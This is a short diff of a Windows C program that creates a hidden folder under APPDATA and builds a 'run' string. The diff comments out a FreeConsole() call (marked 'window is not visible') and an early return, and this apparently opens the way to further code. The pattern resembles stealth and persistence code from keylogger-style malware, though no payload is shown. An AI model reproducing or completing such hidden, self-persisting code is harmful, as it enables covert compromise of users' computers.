@@ -15,7 +15,7 @@
 #include <time.h>
 
 main(){
-    FreeConsole();  //window is not visible
+    //FreeConsole();  //window is not visible
 
     char* appdataFolder = getenv("APPDATA");
 
@@ -27,7 +27,7 @@ main(){
     if(CreateDirectory(folderPath ,NULL))    //if directory creation does not fail
     {
         SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
-        return 0; // :)
+        //return 0; // :)
 
         ///////////////////////////
         char run[100]={""};
